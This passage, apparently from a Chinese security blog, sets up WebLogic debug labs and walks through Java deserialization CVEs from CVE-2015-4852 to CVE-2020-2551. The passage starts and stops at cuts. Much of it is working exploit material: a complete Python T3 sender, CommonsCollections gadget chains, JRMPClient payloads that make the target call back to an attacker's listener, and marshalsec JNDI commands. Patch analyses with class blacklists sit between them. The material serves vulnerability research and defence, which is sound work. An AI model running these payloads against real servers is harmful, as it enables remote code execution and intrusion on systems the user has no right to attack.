10.3.6.0</h3><blockquote><p>参考<a href="vulhub/weblogic版本">vulhub/weblogic版本</a></p></blockquote><ol><li><p>创建docker-compose.yml</p><pre><code class="yml">version: &#39;2&#39;services:    weblogic:        image: vulhub/weblogic        environment:            debugFlag: &quot;true&quot;        ports:            - &quot;7001:7001&quot;            - &quot;8453:8453&quot;</code></pre></li><li><p>运行<code>docker-compose up -d</code></p></li><li><p>把weblogic的源码和jdk包拷出来</p><blockquote><p>要是源码太多了，就只复制wlserver出来就好</p></blockquote><pre><code class="shell">docker cp [weblogic id]:/root ./root</code></pre></li><li><p>IDEA打开<code>/root/Oracle/Middleware/wlserver_10.3/</code>目录</p></li><li><p>把Middleware目录下所有的*.jar包都放在一个test的文件夹里（同名.jar会有影响，比如CVE-2020-14645）</p><pre><code class="shell">mkdir test &amp;&amp; find ./ -name &#39;*.jar&#39; -exec cp &#123;&#125; ./test/ \; 2&gt;/dev/null</code></pre></li><li><p>然后在<code>Project Settings-&gt;Libraries</code>下添加test目录</p></li><li><p>前往<code>Project Settings-&gt;Project</code>，选用WebLogic自带的jdk1.6</p></li><li><p>创建remote server，配置远程调试的IP（localhost）和端口（8453），点击debug，出现以下信息即为成功</p><pre><code class="shell">Connected to the target VM, address: &#39;localhost:8453&#39;, transport: &#39;socket&#39;</code></pre></li><li><p>（附）抓取流量</p><pre><code class="shell">sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.listapt-get cleanapt-get updateapt-get install tcpdumptcpdump -w /tmp/tcp.capdocker cp [weblogic id]:/tmp/tcp.cap ./</code></pre></li></ol><h3 id="weblogic-12-2-1-4"><a href="#weblogic-12-2-1-4" class="headerlink" title="weblogic: 12.2.1.4"></a>weblogic: 12.2.1.4</h3><blockquote><p>参考<a href="https://hub.docker.com/_/oracle-weblogic-server-12c">官网</a>，后面的CVE-2020-13645会用到</p></blockquote><ol><li><p>在当前路路径创建<code>domain.properties</code>文件</p><blockquote><p>注意密码需要至少8个字符，且至少有1个数字或特殊符号，否则会报错</p></blockquote><pre><code class="json">username=myadminusernamepassword=myadminpassword!</code></pre></li><li><p>创建<code>docker-compose.yml</code>文件</p><blockquote><p>默认是生产模式，所以这里把PRODUCTION_MODE设为””，否则无法调试</p><p>DOMAIN_NAME默认为空，这里设置为”base_domain”，否则会报找不到文件错误</p></blockquote><pre><code class="yml">version: &#39;2&#39;services:    weblogic:        image: store/oracle/weblogic:12.2.1.4-dev-200117        environment:            DOMAIN_NAME: &quot;base_domain&quot;            debugFlag: &quot;true&quot;            PRODUCTION_MODE: &quot;&quot;            ADMINISTRATION_PORT_ENABLED: &quot;false&quot;        volumes:          - type: bind            source: ./            target: /u01/oracle/properties        ports:            - &quot;7001:7001&quot;            - &quot;8453:8453&quot;            - &quot;9002:9002&quot;</code></pre></li><li><p>启动docker</p><pre><code class="shell">docker-compose up -d</code></pre></li><li><p>拷贝源码和jdk</p><pre><code class="shell">docker cp [weblogic id]:/u01 ./u01</code></pre></li><li><p>后面步骤和上面一样</p></li></ol><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><h4 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p></blockquote><p><strong>payload</strong></p><p>生成反序列化payload</p><pre><code class="python">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &quot;touch /tmp/success&quot; &gt; poc.ser</code></pre><p>祖传T3脚本</p><pre><code class="python">import binasciiimport socketimport timedef t3_send(ip, port, file):    t3_header = &#39;t3 10.3.6\nAS:255\nHL:19\n\n&#39;    host = (ip, int(port))    # socket connect    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.settimeout(15)    sock.connect(host)    # send t3 header    sock.send(t3_header.encode(&#39;utf-8&#39;))    # time.sleep(1)    resp1 = sock.recv(1024)    # first part    data1 = &#39;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000&#39;    # second part, BIN -&gt; HEX    with open(file, &#39;rb&#39;) as f:        payload = binascii.b2a_hex(f.read()).decode(&#39;utf-8&#39;)    # join    data = data1 + payload    # get lenth and join    data = &#39;%s%s&#39; % (&#39;&#123;:08x&#125;&#39;.format(len(data) // 2 + 4), data)    # a2b: HEX -&gt; BIN    sock.send(binascii.a2b_hex(data))if __name__ == &#39;__main__&#39;:    t3_send(&#39;127.0.0.1&#39;,&#39;7001&#39;,&#39;poc.ser&#39;)</code></pre><p><strong>漏洞分析</strong></p><p>漏洞利用的原理利用<code>TransformedMap.setValue()</code>或者<code>LazyMap.get()</code>（ysoserial用的就是这个方法）方法来触发<code>Apache Commons Collections</code>，而在我们的<code>AnnotationInvocationHandler</code>类中，都含有这两个方法的调用，下面我们来看一下它们的入口点</p><p>以<code>TransformedMap</code>为例，在<code>AnnotationInvocationHandler</code>类中，我们可以发现<code>memberValues</code>的类型为<code>Map&lt;String, Object&gt;</code>，我们可以控制其类型为<code>TransformedMap</code>，然后<code>readObject()</code>方法的方法中，我们可以看到<code>entrySet</code>调用了<code>setValue()</code>方法，满足利用条件</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435a1f8cd7abec091ddbb24.png" alt="image-20210124182703110"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435b5a259cd2d0a4f07dfb2.png" alt="image-20210124182534426"></p><blockquote><p>这里有一处小细节就是，为了让var7非空，我们需要执行<code>innerMap.put(&quot;value&quot;, &quot;value&quot;);</code>，原因是我们的var3的值为[“value”] =&gt; “class java.lang.annotaion.RetentionPolicy”，即只有一个”value”的key值，具体可自行去参考它的实现</p></blockquote><p>这里给出代码实现</p><pre><code class="java">import java.io.;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class CommonsCollection1 &#123;    public static void main(String[] args) throws Exception &#123;        //Runtime.getRuntime().exec(&quot;calc&quot;);         Transformer[] transformers = new Transformer[] &#123;            new ConstantTransformer(Runtime.class),            new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                String.class, Class[].class                    &#125;, new Object[] &#123;                &quot;getRuntime&quot;,                new Class[0]            &#125;),            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                Object.class, Object[].class                    &#125;, new Object[] &#123;                null,                new Object[0]            &#125;),            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;                String.class                    &#125;, new Object[] &#123;                &quot;calc&quot;            &#125;)        &#125;;        Transformer chainedTransformer = new ChainedTransformer(transformers);        //只需要有一处调用 chainedTransformer         Map inMap = new HashMap();        inMap.put(&quot;value&quot;, &quot;value&quot;);        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;            Class.class, Map.class        &#125;);        ctor.setAccessible(true);        Object instance = ctor.newInstance(new Object[] &#123;            Retention.class, outMap        &#125;);        // 写出到文件        FileOutputStream fos = new FileOutputStream(&quot;payload.ser&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(instance);        oos.flush();        oos.close();        // 模拟触发代码执行         FileInputStream fis = new FileInputStream(&quot;payload.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        Object newObj = ois.readObject();        ois.close();    &#125;&#125;</code></pre><p>以<code>LazyMap</code>为例，触发点在调用<code>memerValues.entrySet()</code>时会触发它的<code>invoke()</code>方法，其中存在<code>get()</code>方法满足利用条件</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714358835f39a30b4f5a8bb38.png" alt="image-20210124192432215"></p><p>代码的实现参考ysoserial的</p><pre><code class="java">package ysoserial.payloads;import java.lang.reflect.InvocationHandler;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.Dependencies;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.Gadgets;import ysoserial.payloads.util.JavaVersion;import ysoserial.payloads.util.PayloadRunner;import ysoserial.payloads.util.Reflections;@PayloadTest(precondition = &quot;isApplicableJavaVersion&quot;)@Dependencies(&#123;    &quot;commons-collections:commons-collections:3.1&quot;&#125;)@Authors(&#123;    &quot;frohoff&quot;&#125;)public class CommonsCollections1    extends PayloadRunner    implements ObjectPayload &lt; InvocationHandler &gt; &#123;    public InvocationHandler getObject(String command)    throws Exception &#123;        String[] execArgs = &#123;            command        &#125;;        Transformer transformerChain = new ChainedTransformer(new Transformer[] &#123;            new ConstantTransformer(Integer.valueOf(1))        &#125;);        Transformer[] transformers = &#123;            new ConstantTransformer(Runtime.class),            new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                String.class, Class[].class            &#125;, new Object[] &#123;                &quot;getRuntime&quot;,                new Class[0]            &#125;),            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                Object.class, Object[].class            &#125;, new Object[] &#123;                null,                new Object[0]            &#125;),            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;                String.class            &#125;, execArgs),            new ConstantTransformer(Integer.valueOf(1))        &#125;;        Map innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        Map mapProxy = (Map) Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]);        InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);        return handler;    &#125;    public static void main(String[] args)    throws Exception &#123;        PayloadRunner.run(CommonsCollections1.class, args);    &#125;    public static boolean isApplicableJavaVersion() &#123;        return JavaVersion.isAnnInvHUniversalMethodImpl();    &#125;&#125;</code></pre><p><strong>补丁</strong></p><p>增加<code>ClassFilter.isBlackListed()</code>函数并把涉及到的3个类加入到黑名单</p><pre><code>weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStreamweblogic.rjvm.MsgAbbrevInputStream.classweblogic.iiop.Utils.class</code></pre><h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p><strong>工具利用</strong></p><p><a href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p><p>IDEA创建application配置，在Program arguments填入，或者导出.jar</p><pre><code class="shell">-H &quot;127.0.0.1&quot; -C &quot;touch /tmp/success&quot; -B -os linux</code></pre><p><strong>漏洞分析</strong></p><p>此漏洞是对CVE-2015-4852的黑名单进行绕过，对整个利用链再加一层封装即可绕过黑名单，新的利用点在<code>weblogic.jms.common.StreamMessageImpl</code>类中的<code>readExternal()</code>方法把传入的序列化数据，调用到上面CVE-2015-4852提到的<code>readObject()</code>的方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714353df5a7a5d2ddf1caaef7.png" alt="image-20210125161308443"></p><p>所以exploit的写法就是把<code>CommonsCollections1</code>的实现再套一层<code>StreamMessageImpl</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021356fb595eb0794698ec7722.png" alt="image-20210127205403637"></p><p><strong>补丁</strong></p><p>把涉及类加入到黑名单</p><pre><code>weblogic.jms.common.StreamMessageImpl</code></pre><h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p><p>修改TYPE如下</p><pre><code class="java">public static String TYPE = &quot;marshall&quot;;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714356a85e15315bcd21561f5.png" alt="image-20210125163013383"></p><p><strong>漏洞分析</strong></p><p>这个CVE也是对CVE-2015-4852的黑名单进行绕过，利用到的类是<code>weblogic.corba.utils.MarshalledObject</code>类，在反序列化这个类的时候会调用<code>readResolve()</code>方法，里面也调用了ObjectInputStream的<code>readObject()</code>方法</p><p><code>MarshalledObject</code>在构造时把参数<code>var1</code>传到<code>this.objBytes</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436987d24cd4e9b48d1de9b.png" alt="image-20210125163953194"></p><p>在调用<code>readResolve()</code>方法时会触发<code>readObject()</code>函数</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436a8b136590b4722202792.png" alt="image-20210125164049349"></p><p>同理exploit的写法是把<code>CommonsCollections1</code>的实现再套一层<code>MarshalledObject</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020213564684f54ab2b300cdfcdd.png" alt="image-20210127205454949"></p><p><strong>补丁</strong></p><p>把涉及类加入到黑名单</p><pre><code>weblogic.corba.utils.MarshalledObject</code></pre><h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p></blockquote><p><strong>poc</strong></p><pre><code class="shell">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#39;touch /tmp/success&#39;</code></pre><p><a href="https://www.exploit-db.com/exploits/44553">攻击脚本</a></p><pre><code class="shell">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient</code></pre><pre><code class="java">// JRMPClientpackage ysoserial.payloads;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@SuppressWarnings ( &#123;    &quot;restriction&quot;&#125; )@PayloadTest( harness = &quot;ysoserial.payloads.JRMPReverseConnectSMTest&quot;)@Authors(&#123; Authors.MBECHLER &#125;)public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Registry&gt; &#123;    public Registry getObject ( final String command ) throws Exception &#123;        String host;        int port;        int sep = command.indexOf(&#39;:&#39;);        if ( sep &lt; 0 ) &#123;            port = new Random().nextInt(65535);            host = command;        &#125;        else &#123;            host = command.substring(0, sep);            port = Integer.valueOf(command.substring(sep + 1));        &#125;        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;            Registry.class        &#125;, obj);        return proxy;    &#125;    public static void main ( final String[] args ) throws Exception &#123;        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());        PayloadRunner.run(JRMPClient.class, args);    &#125;&#125;</code></pre><p><strong>漏洞分析</strong></p><p>这里其实利用到了RMI和DGC的机制，当<strong>DGC Client</strong>调用远程对象时，会调用<strong>DGC Server</strong>的<code>dirty()</code>函数，这时<strong>DGC Server</strong>就向<strong>DGC Client</strong>返回一个<code>lease(DGCClient.vmid, DGCClient.leaseValue)</code>；当<strong>DGC Client</strong>不需要这个远程对象时，就会调用<strong>DGC Server</strong>的<code>clean()</code>函数，这个漏洞的关键点就在于我们可以伪造恶意的DGC Server向<strong>DGC Client</strong>，即victim，回送一个包含恶意payload的对象，让<strong>DGC Client</strong>在DGC层执行反序列化触发payload</p><p>漏洞链如下</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436405b059050f3937f636e.png" alt="image-20210126142905037" style="zoom:67%;" /><p><strong>补丁</strong></p><p>在<code>resolveProxyClass()</code>方法中加入对<code>java.rmi.registry.Registry</code>的检查</p><pre><code class="java">protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123;    String[] arr$ = interfaces;    int len$ = interfaces.length;    for(int i$ = 0; i$ &lt; len$; ++i$) &#123;        String intf = arr$[i$];        if(intf.equals(&quot;java.rmi.registry.Registry&quot;)) &#123;            throw new InvalidObjectException(&quot;Unauthorized proxy deserialization&quot;);        &#125;    &#125;    return super.resolveProxyClass(interfaces);&#125;</code></pre><h4 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p></blockquote><p><strong>poc</strong></p><pre><code class="shell">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#39;touch /tmp/success&#39;</code></pre><pre><code class="shell">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient2</code></pre><blockquote><p>还有一种通过CVE-2016-1000031 Apache Commons Fileupload进行任意文件写入</p><p>再者可以直接去掉CVE-2017-3248的Proxy的封装，从而直接绕过resolveProxyClass()方法</p></blockquote><p><strong>漏洞分析</strong></p><p>此漏洞是对CVE-2017-3248的绕过，因为<code>InboundMsgAbbrev</code>类的<code>resolveProxyClass()</code>仅仅只是对<code>java.rmi.registry.Registry</code>进行判断，所以我们可以通过其他RMI接口绕过，比如<code>java.rmi.activation.Activator</code></p><p>exploit的编写就是直接替换</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101272148c437c1ee4656e33bf769.png" alt="image-20210127214823732"></p><p><strong>补丁</strong></p><p>在<code>WeblogicFilterConfig.class</code>的黑名单中添加了<code>sun.rmi.server.UnicastRef</code>进行防御</p><pre><code class="java">private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]&#123;     &quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;,      &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;,      &quot;org.codehaus.groovy.runtime.MethodClosure&quot;,     &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;,      &quot;sun.rmi.server.UnicastRef&quot; // new &#125;;</code></pre><h4 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p></blockquote><p><strong>payload</strong></p><pre><code class="java">public class JRMPClient3 extends PayloadRunner implements ObjectPayload &lt; Registry &gt; &#123;    public Object streamMessageImpl(byte[] object) &#123;        StreamMessageImpl streamMessage = new StreamMessageImpl();        streamMessage.setDataBuffer(object, object.length);        return streamMessage;    &#125;    public Object getObject(final String command) throws Exception &#123;        String host;        int port;        int sep = command.indexOf(&#39;:&#39;);        if (sep &lt; 0) &#123;            port = new Random().nextInt(65535);            host = command;        &#125; else &#123;            host = command.substring(0, sep);            port = Integer.valueOf(command.substring(sep + 1));        &#125;        ObjID objID = new ObjID(new Random().nextInt());        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);        Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;            Registry.class        &#125;, remoteObjectInvocationHandler);        return streamMessageImpl(Serializer.serialize(object)); // 用streamMessageImpl封装    &#125;    public static void main(final String[] args) throws Exception &#123;        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());        PayloadRunner.run(JRMPClient3.class, args);    &#125;&#125;</code></pre><p><strong>漏洞分析</strong></p><p>此漏洞是对CVE-2018-2628的黑名单绕过，主要利用<code>weblogic.jms.common.StreamMessageImpl</code>在反序列化时不用经过<code>resolveProxyClass()</code>检查</p><p><strong>补丁</strong></p><pre><code class="java">private static final String[] DEFAULT_BLACKLIST_PACKAGES = &#123;     &quot;org.apache.commons.collections.functors&quot;,     &quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;,     &quot;javassist&quot;,     &quot;java.rmi.activation&quot;, // new    &quot;sun.rmi.server&quot; // new&#125;;private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[] &#123;    &quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;,     &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;,     &quot;org.codehaus.groovy.runtime.MethodClosure&quot;,     &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;,     &quot;java.rmi.server.UnicastRemoteObject&quot;, // new    &quot;java.rmi.server.RemoteObjectInvocationHandler&quot; // new&#125;;</code></pre><h4 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p></blockquote><p><strong>poc</strong></p><p><em>payload1</em></p><pre><code class="java">package ysoserial.payloads;import java.rmi.server.ObjID;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.util.PayloadRunner;import javax.management.remote.rmi.RMIConnectionImpl_Stub;@SuppressWarnings ( &#123;    &quot;restriction&quot;&#125; )public class JRMPClient3 extends PayloadRunner implements ObjectPayload&lt;Object&gt; &#123;    public Object getObject ( final String command ) throws Exception &#123;        String host;        int port;        int sep = command.indexOf(&#39;:&#39;);        if ( sep &lt; 0 ) &#123;            port = new Random().nextInt(65535);            host = command;        &#125;        else &#123;            host = command.substring(0, sep);            port = Integer.valueOf(command.substring(sep + 1));        &#125;        ObjID id = new ObjID(new Random().nextInt());        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RMIConnectionImpl_Stub stub = new RMIConnectionImpl_Stub(ref); // 使用RMIConnectionImpl_Stub封装        return stub;    &#125;    public static void main ( final String[] args ) throws Exception &#123;        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());        PayloadRunner.run(JRMPClient3.class, args);    &#125;&#125;</code></pre><p><em>payload2</em></p><pre><code class="java">package ysoserial.payloads;import java.rmi.server.ObjID;import java.util.Random;import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@SuppressWarnings ( &#123;    &quot;restriction&quot;&#125; )public class JRMPClient4 extends PayloadRunner implements ObjectPayload&lt;ReferenceWrapper_Stub&gt; &#123;    public ReferenceWrapper_Stub  getObject ( final String command ) throws Exception &#123;        String host;        int port;        int sep = command.indexOf(&#39;:&#39;);        if ( sep &lt; 0 ) &#123;            port = new Random().nextInt(65535);            host = command;        &#125;        else &#123;            host = command.substring(0, sep);            port = Integer.valueOf(command.substring(sep + 1));        &#125;        ObjID id = new ObjID(new Random().nextInt());        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        ReferenceWrapper_Stub stu = new ReferenceWrapper_Stub(ref); // 使用ReferenceWrapper_Stub封装        return stu;    &#125;    public static void main ( final String[] args ) throws Exception &#123;        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());        PayloadRunner.run(JRMPClient3.class, args);    &#125;&#125;</code></pre><p><strong>漏洞分析</strong></p><p>此漏洞是对cve-2018-2893的黑名单绕过，可以使用<code>ReferenceWrapper_Stub</code>或者<code>RMIConnectionImpl_Stub</code>代替<code>RemoteObjectInvocationHandler</code>，关键是在找<code>RemoteObject</code>类的子类</p><p><strong>补丁</strong></p><p>直接将基类<code>RemoteObject</code>加入到黑名单</p><h4 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h4><blockquote><p>WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/SukaraLin/CVE-2019-2890">https://github.com/SukaraLin/CVE-2019-2890</a></p><p>详细操作在README已经给出</p><p><strong>漏洞分析</strong></p><p>漏洞代码位于<code>weblogic.jar</code>中的<code>weblogic.wsee.jaxws.persistence.PersistentContext.class</code>类中，它的<code>readSubject()</code>方法中直接调用了<code>readObject()</code>方法进行反序列化，所以我们只要对着<code>writeObject()</code>写一个恶意对象就可以</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373db23c5e588f464ce262.png" alt="image-20210126175015051"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437983682858b6836f4756d.png" alt="image-20210126175040943"></p><p><strong>补丁</strong></p><p>增加黑名单检测</p><pre><code class="java">public static class WSFilteringObjectInputStream extends FilteringObjectInputStream &#123;    private String firstClassName;    public WSFilteringObjectInputStream(InputStream in) throws IOException &#123;        super(in);    &#125;    protected Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) throws ClassNotFoundException, IOException &#123;         Class clazz = super.resolveClass(descriptor);        if (this. firstClassName == null) &#123;            String className = descriptor.getName();             try &#123;                clazz.asSubclass(Subject.class);]            &#125; catch (Exception var5) &#123;                throw new InvalidClassException(&quot;Internal System Error&quot;);            &#125;            this. firstClassName = className;        &#125;        return clazz;    &#125;&#125;</code></pre><h4 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h4><blockquote><p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/Y4er/CVE-2020-2551.git">https://github.com/Y4er/CVE-2020-2551.git</a></p><p>这个payload只能用在直连网络下，所以Win下本地打docker是打不了的，你可以选择自己本地搭一个服务器，可以选择在Linux虚拟机起docker，当然还有更简单的就是自己在docker里装个jdk8，然后在docker里打（因为这个payload只能用jdk8运行）</p><p>创建依赖库的<code>wlfullclient.jar</code></p><pre><code class="shell">cd WL_HOME/server/libjava -jar wljarbuilder.jar</code></pre><p>编译exp.java，这里必须保证jdk版本与目标环境一样</p><pre><code class="shell">javac -source 1.6 -target 1.6 exp.java</code></pre><p>开启JNDI触发漏洞</p><pre><code class="shell">python -m SimpleHTTPServer 80java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://172.18.0.2/#exp&quot; 1099java -jar CVE-2020-2551.jar 172.18.0.2 7001 rmi://172.18.0.2:1099/exp</code></pre><p><strong>漏洞分析</strong></p><p>RMI-IIOP具体原理可参考这篇<a href="https://xz.aliyun.com/t/7422">文章</a></p><p>这个漏洞源于对<code>JtaTransactionManager</code>类的错误过滤导致的IIOP反序列化，我们把入口点定在<code>JtaTransactionManager</code>类的<code>readObject()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357376eba9d4fcbd4f18d3e.png" alt="image-20210129213556384"></p><p>在<code>initUserTransactionAndTransactionManager()</code>方法中调用了<code>lookupUserTransaction()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357e8f7f0c1ecfb087927ac.png" alt="image-20210129213630278"></p><p>在<code>lookupUserTransaction()</code>方法中使用<code>getJndiTemplate()</code>返回的<code>jndiTemplate</code>实例的<code>lookup()</code>方法进行JNDI</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135808a71fb5f2e6ce2397eb.png" alt="image-20210129213658529"></p><p>所以只要控制我们的<code>userTransactionName</code>属性就可以JNDI任意类</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135893e48783bc4de871b44d.png" alt="image-20210129213846393"></p><p>根据这篇<a href="https://xz.aliyun.com/t/7422">博客</a>可以知道，这个gadget在<a 